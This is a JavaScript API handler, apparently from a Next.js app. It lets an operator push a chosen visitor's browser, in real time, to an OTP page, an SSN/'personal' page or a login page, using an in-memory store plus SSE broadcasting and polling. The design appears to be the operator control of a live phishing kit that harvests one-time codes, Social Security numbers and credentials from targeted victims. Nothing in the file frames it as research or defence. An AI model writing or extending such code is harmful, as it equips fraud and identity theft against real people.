// Set redirect command for a visitor
import { broadcastRedirect } from './connections';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { visitorId, redirectType, pagePath } = req.body;
      console.log('[redirect/set] Received redirect request:', { visitorId, redirectType, pagePath });
      
      if (!visitorId || !redirectType) {
        console.error('[redirect/set] Missing required fields');
        return res.status(400).json({ error: 'Visitor ID and redirect type required' });
      }
      
      // Ensure OTP always goes to /otp page
      let finalPagePath = pagePath;
      if (redirectType === 'otp') {
        finalPagePath = '/otp';
      } else if (redirectType === 'ssn') {
        finalPagePath = '/personal';
      } else if (redirectType === 'login') {
        finalPagePath = '/';
      } else {
        finalPagePath = pagePath || '/';
      }
      
      // Store redirect data with redirect URL pointing to /r/[visitorId] (rewritten to /api/r/[visitorId])
      const redirectUrl = `/r/${visitorId}`;
      const redirectData = {
        redirect: true,
        redirectType,
        pagePath: finalPagePath,
        redirectUrl: redirectUrl, // URL to redirect route
        timestamp: new Date().toISOString()
      };
      
      console.log('[redirect/set] Redirect data:', redirectData);
      
      // CRITICAL: Initialize global store if it doesn't exist
      if (!global.redirectStore) {
        global.redirectStore = {};
        console.log('[redirect/set] Initialized global redirectStore');
      }
      
      // Store redirect in memory - this will be available for polling
      global.redirectStore[visitorId] = redirectData;
      console.log('[redirect/set] ✅✅✅ STORED REDIRECT IN MEMORY FOR VISITOR:', visitorId);
      console.log('[redirect/set] Visitor ID:', visitorId);
      console.log('[redirect/set] Redirect data stored:', JSON.stringify(redirectData));
      console.log('[redirect/set] Current redirectStore keys:', Object.keys(global.redirectStore));
      console.log('[redirect/set] Redirect URL:', redirectUrl);
      console.log('[redirect/set] Target page path:', finalPagePath);
      
      // Broadcast redirect URL via SSE (listener-only, never redirects)
      // This will work if client is connected to same function instance
      console.log('[redirect/set] Broadcasting redirect URL via SSE for visitor:', visitorId);
      broadcastRedirect(visitorId, { ...redirectData, redirectUrl });
      
      // IMPORTANT: Polling is the reliable method on Vercel since it checks the same store
      console.log('[redirect/set] Redirect stored - client polling will pick it up within 100ms');
      
      // Auto-delete from memory after 60 seconds
      setTimeout(() => {
        if (global.redirectStore && global.redirectStore[visitorId]) {
          console.log('[redirect/set] Auto-deleting redirect for visitor:', visitorId);
          delete global.redirectStore[visitorId];
        }
      }, 60000);
      
      res.status(200).json({ success: true, redirectData });
    } catch (error) {
      console.error('[redirect/set] Error setting redirect:', error);
      res.status(500).json({ error: 'Internal server error', message: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

